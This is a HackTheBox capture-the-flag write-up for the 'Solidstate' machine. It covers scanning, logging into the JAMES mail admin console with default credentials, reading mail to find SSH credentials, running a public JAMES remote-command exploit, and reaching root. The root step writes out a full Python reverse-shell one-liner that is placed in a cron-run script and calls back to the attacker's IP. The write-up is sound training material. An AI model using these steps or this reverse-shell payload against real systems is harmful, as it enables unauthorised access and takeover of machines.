# Solidstate | HackTheBox

### 1. Scan
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-cidvmbkzfc]─[~]
└──╼ [★]$ sudo nmap -A -p- -T4 10.129.29.189
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-21 03:09 UTC
Nmap scan report for 10.129.29.189
Host is up (0.22s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3?
119/tcp  open  nntp?
4555/tcp open  rsip?
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/21%OT=22%CT=1%CU=32269%PV=Y%DS=2%DC=T%G=Y%TM=5FE014
OS:56%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M54DST11NW6%O2=M54DST11NW6%O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST
OS:11NW6%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   218.04 ms 10.10.14.1
2   218.17 ms 10.129.29.189

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 599.38 seconds
```
The machine is running SSH, a HTTP server on port 80, and there are some other ports open - 25, 110, 119 and 4555.

### 2. Enumeration
Check out the website first. It is a HTML template called "Solid State" with a couple of pages, and also a "contact" form. I check for SQL injection, try sending some links and inspecting requests in the proxy, and don't find anything. I also dirbust the site every which way and don't find anything.  
Next, check out and get the version for smtp/pop3 as nmap wasn't able to do it.
```bash
msf5 auxiliary(scanner/smtp/smtp_version) > run

[+] 10.129.29.189:25      - 10.129.29.189:25 SMTP 220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Sun, 20 Dec 2020 22:47:41 -0500 (EST)\x0d\x0a
[*] 10.129.29.189:25      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf5 auxiliary(scanner/pop3/pop3_version) > run

[+] 10.129.29.189:110     - 10.129.29.189:110 POP3 +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready \x0d\x0a
[*] 10.129.29.189:110     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
These ports are running services from JAMES 2.3.2. The remote administration panel is on port 4555, so I can attempt to log in  with default credentials over telnet.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-cidvmbkzfc]─[~]
└──╼ [★]$ telnet 10.129.29.189 4555
Trying 10.129.29.189...
Connected to 10.129.29.189.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit
```
I get logged in with the default creds. From here I can list users:
```bash
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```
I can reset passwords as well which is cool.  
```bash
Welcome root. HELP for a list of commands
setpassword thomas password
Password for thomas reset
setpassword james password
Password for james reset
setpassword mindy password
Password for mindy reset
setpassword john password
Password for john reset
setpassword mailadmin password
Password for mailadmin reset
```
I then login over POP3 in telnet and see if any users have e-mail. Mindy has some messages:
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ telnet 10.129.29.189 110                                                                                                                                                                   1 ⨯
Trying 10.129.29.189...
Connected to 10.129.29.189.
Escape character is '^]'.
USER mindy
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
+OK
PASS password
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.

```
This gives me some possible login credentials: `mindy:P@55W0rd1!2@`.

### 3. Get a shell
Login with the creds:
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh mindy@10.129.29.189                                                                                                                                                                  130 ⨯
mindy@10.129.29.189's password: 

Permission denied, please try again.
mindy@10.129.29.189's password: 
Permission denied, please try again.
mindy@10.129.29.189's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$ whoami
-rbash: whoami: command not found
```
This account set up with a restricted shell. Still, from here I can browse some directories and see that there is nothing in the /var/www/html directories aside from the template files.
  
The good news from here is that there is an authenticated remote command execution exploit I can leverage to run commands on the machine: https://www.exploit-db.com/exploits/35513. A better explanation can be found at: https://www.rapid7.com/db/modules/exploit/linux/smtp/apache_james_exec/. The key part is this:
  
*Messages for a given user are stored in a directory partially defined by the username. By creating a user with a directory traversal payload as the username, commands can be written to a given directory.*
  
For the payload to tbe triggered, a user needs to login to the machine, which I can do via the "mindy" user. I should be able to use the exploit to create a reverse shell command on the machine that will run when one of the users logs in, hopefully with more freedom. 
I modify the exploit so that it will execute for any user, and make it a bash reverse shell. Then I run it.
```bash
┌──(kali㉿kali)-[~/Desktop/htb/solidstate]
└─$ python jamesexec.py 10.129.29.189
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in.
```
Next, start my listener, then re-attempt a login with mindy. This time I get a bunch of bash_completion errors, but I also get a connection in my listener.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 9999            
listening on [any] 9999 ...
connect to [10.10.14.162] from (UNKNOWN) [10.129.29.189] 50662
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ 

${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
whoami
mindy
```
This shell appears to be more complete, although it is still /bin/rbash so I can't sudo. I try a bunch of ways to escape out of it, nothing seems to work.

### 3. Enumeration from foothold
Run linpeas, and see that it discovers a world-writable python script in the /opt directory.
```bash
[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                                                     
/dev/mqueue                                                                                                                                                                                        
/dev/shm
/home/mindy
/opt/tmp.py
/run/lock
/run/user/1001
/run/user/1001/gnupg
/run/user/1001/systemd
/run/user/1001/systemd/transient
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/var/tmp
```
Check it out:
```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ./linpeas.sh > linpeas_out.txt
./linpeas.sh > linpeas_out.txt
ls: cannot access '': No such file or directory
ls: cannot open directory '/home/james/.gnupg': Permission denied
ls: cannot open directory '/home/james/.local/share/keyrings': Permission denied
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ cat /opt/tmp.py
cat /opt/tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```
This script is removing everything in the tmp directory. Interestingly that is the current directory I am working out of. If I try to list files I see that my linpeas script and output file is now gone. Therefore the script must be running regulary at some interval.

### 4. Escalate to root
Replace this tmp.py file with a reverse shell and then wait.
```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ echo "#!/usr/bin/env python" > /opt/tmp.py && echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.162',9998));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" >> /opt/tmp.py && echo "Done"
Done
```
Catch the root shell.
```bash
┌──(kali㉿kali)-[~/…/htb/solidstate/privilege-escalation-awesome-scripts-suite/linPEAS]
└─$ nc -lvnp 9998                                        
listening on [any] 9998 ...
connect to [10.10.14.162] from (UNKNOWN) [10.129.29.189] 51688
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```